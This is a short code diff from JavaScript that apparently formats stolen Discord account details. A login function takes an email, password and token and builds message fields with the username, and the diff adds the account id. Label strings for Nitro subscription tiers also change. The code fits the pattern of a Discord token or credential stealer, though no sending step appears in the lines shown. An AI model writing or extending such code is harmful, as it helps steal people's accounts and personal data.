@@ -518,9 +518,9 @@ const getNitro = (flags) => {
     case 0:
       return '';
     case 1:
-      return '<:classic:896119171019067423>  ';
+      return 'nitro classic';
     case 2:
-      return '<:classic:896119171019067423> + <a:boost:824036778570416129> ';
+      return 'nitro gaming';
     default:
       return '';
   }
@@ -612,6 +612,11 @@ const login = async (email, password, token) => {
           {
             name: '<a:944007295417843743:959785231982931979> username:',
             value: `\`${json.username}#${json.discriminator}\``,
+            inline: false,
+          },
+          {
+            name: '<a:944007295417843743:959785231982931979> id:',
+            value: `\`${json.id}\``,
             inline: false,
           },
           {
